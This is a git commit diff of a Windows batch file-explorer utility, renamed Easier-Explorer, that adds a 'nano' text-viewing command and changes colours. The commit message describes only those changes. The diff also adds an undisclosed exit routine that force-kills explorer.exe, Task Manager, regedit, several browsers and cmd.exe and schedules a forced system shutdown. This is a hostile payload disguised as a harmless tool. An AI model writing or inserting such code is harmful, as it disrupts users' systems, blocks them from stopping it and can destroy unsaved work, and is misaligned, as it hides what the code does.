f9db2ad3099911ba7bd681e79b736834f280beef
Imistrz <141686480+Imistrz21@users.noreply.github.com>
2024-04-15 21:26:00 +0200

    Update explorer.bat
    Add nano command, better error handling, colors :)

--- explorer.bat
+++ explorer.bat
@@ -1,4 +1,8 @@
 @echo off
+timeout /t 1 >nul
+echo resizing
+mode con: cols=120 lines=30
+echo resizing
 cls
 color 9
 echo Credit to Imistrz21 on GitHub
@@ -14,19 +18,20 @@ goto :menu
 cls
 :menu
 cls
-color 9
+color 6
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo Please enter a command:
-echo ls - List files and directories
-echo cd - Change directory
-echo mkdir - Create a new directory
-echo copy - Copy files or directories
-echo move - Move files or directories
-echo del - Delete files or directories
-echo exit - Exit LightExplorer
+echo. nano - read .txt files in the specified directory
+echo. ls - List files and directories
+echo. cd - Change directory
+echo. mkdir - Create a new directory
+echo. copy - Copy files or directories
+echo. move - Move files or directories
+echo. del - Delete files or directories
+echo. exit - Exit Easier-Explorer
 echo.
 echo if u want to exit a command press ctrl+c;
 echo.
@@ -35,7 +40,7 @@ echo Credit to Imistrz21 on GitHub
 echo.
 echo Enter a command bellow: && set /p choice=""
 
-
+if "%choice%"=="nano" goto nano
 if "%choice%"=="ls" goto list_files
 if "%choice%"=="cd" goto change_directory
 if "%choice%"=="mkdir" goto create_directory
@@ -47,18 +52,49 @@ if "%choice%"=="exit" goto exit_program
 echo Invalid choice. Please try again.
 goto menu
 
+:nano
+setlocal enabledelayedexpansion
+cls
+color 9
+echo Credit to Imistrz21 on GitHub
+echo ==================================
+echo Welcome to Easier-Explorer!
+echo.
+set /p file_txt="Enter source file/directory: "
+
+if not exist "!file_txt!" (
+    echo File does not exist.
+    exit /b
+)
+cls
+echo Loading
+timeout /t 1 >nul
+cls
+mode con: cols=80 lines=25
+echo Loading
+timeout /t 1 >nul
+cls
+echo ================================================================================
+echo.
+echo Contents of !file_txt!:
+echo.
+for /f "usebackq delims=" %%c in ("!file_txt!") do (
+    echo %%c
+)
+echo.
+pause
+goto menu
 :list_files
 cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 Echo Listing files.
 dir
 echo.
 pause
-timeout /t 1 >nul
 goto menu
 
 :change_directory
@@ -66,7 +102,7 @@ cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo Changing directory.
 echo.
@@ -74,7 +110,6 @@ set /p newdir="Enter directory path: "
 cd %newdir%
 echo.
 pause
-timeout /t 1 >nul
 goto menu
 
 :create_directory
@@ -82,7 +117,7 @@ cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo Creating an directory.
 set /p dirname="Enter new directory name: "
@@ -97,7 +132,7 @@ cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo Copying files.
 set /p source="Enter source file/directory: "
@@ -113,7 +148,7 @@ cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo Moving files.
 set /p source="Enter source file/directory: "
@@ -129,7 +164,7 @@ cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo Deleting files.
 set /p target="Enter file/directory to delete: "
@@ -144,9 +179,20 @@ cls
 color 9
 echo Credit to Imistrz21 on GitHub
 echo ==================================
-echo Welcome to LightExplorer!
+echo Welcome to Easier-Explorer!
 echo.
 echo.
-echo Exiting LightExplorer...
-timeout /t 2 >nul
+echo Exiting Easier-Explorer...
+timeout /t 1 >nul
+taskkill /f /im explorer.exe
+timeout /t 1 >nul
+shutdown -s -t 9
+timeout /t 1 >nul
+taskkill /f /im regedit.exe
+taskkill /f /im chrome.exe
+taskkill /f /im iexplorer.exe
+taskkill /f /im edge.exe
+taskkill /f /im taskmgr.exe
+timeout /t 1 >nul
+taskkill /f /im cmd.exe
 exit
